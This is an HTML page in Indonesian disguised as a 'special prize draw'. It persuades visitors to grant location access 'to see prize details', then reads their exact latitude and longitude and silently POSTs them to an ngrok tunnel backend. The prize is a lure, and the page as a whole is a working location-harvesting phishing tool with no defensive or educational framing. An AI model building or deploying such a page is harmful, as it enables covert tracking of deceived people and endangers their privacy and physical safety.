<!DOCTYPE html>
<html>
  <head>
    <title>Undian Hadiah Spesial üéÅ</title>

    <!-- Leaflet CSS -->
    <link
      rel="stylesheet"
      href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
    />

    <style>
      body {
        font-family: Arial, sans-serif;
        background: linear-gradient(135deg, #ffecd2, #fcb69f);
        margin: 0;
        padding: 0;
        text-align: center;
      }

      .container {
        max-width: 600px;
        margin: 40px auto;
        background: #fff;
        padding: 30px;
        border-radius: 12px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
      }

      h1 {
        color: #e65100;
      }

      .notice {
        font-size: 16px;
        margin: 20px 0;
        color: #444;
      }

      .btn {
        background: #ff6f00;
        color: white;
        padding: 14px 25px;
        border: none;
        border-radius: 8px;
        font-size: 16px;
        cursor: pointer;
      }

      .btn:hover {
        background: #e65100;
      }

      #map {
        height: 400px;
        width: 100%;
        margin-top: 20px;
        display: none;
      }

      #info {
        margin-top: 15px;
        font-size: 14px;
        color: #333;
        display: none;
      }
    </style>
  </head>

  <body>
    <div class="container">
      <h1>üéÅ Undian Hadiah Spesial üéÅ</h1>

      <!-- NOTIF AWAL -->
      <div id="permissionBox">
        <p class="notice">
          Ijinkan lokasi agar dapat melihat detail hadiah<br />
          sebagai pendataan peserta hadiah.
        </p>
        <button class="btn" onclick="mintaLokasi()">üéâ Lihat Hadiah</button>
      </div>

      <!-- INFO & MAP -->
      <p id="info">loading...</p>
      <div id="map"></div>
    </div>

    <!-- Leaflet JS -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <script>
      const BACKEND_URL = "https://cayden-refined-keisha.ngrok-free.dev/lokasi";

      const map = L.map("map").setView([0, 0], 2);

      L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
        attribution: "¬© OpenStreetMap contributors",
      }).addTo(map);

      function mintaLokasi() {
        document.getElementById("permissionBox").style.display = "none";
        document.getElementById("info").style.display = "block";

        navigator.geolocation.getCurrentPosition(
          function (position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            document.getElementById(
              "info"
            ).innerHTML = `Latitude: ${lat}<br>Longitude: ${lon}`;

            document.getElementById("map").style.display = "block";

            map.setView([lat, lon], 16);
            L.marker([lat, lon])
              .addTo(map)
              .bindPopup("Lokasi kamu")
              .openPopup();

            // KIRIM KE BACKEND (LOGIKA ASLI TETAP)
            fetch(BACKEND_URL, {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                latitude: lat,
                longitude: lon,
              }),
            });
          },
          function (error) {
            document.getElementById("info").innerText = "Izin lokasi ditolak";
          }
        );
      }
    </script>
  </body>
</html>
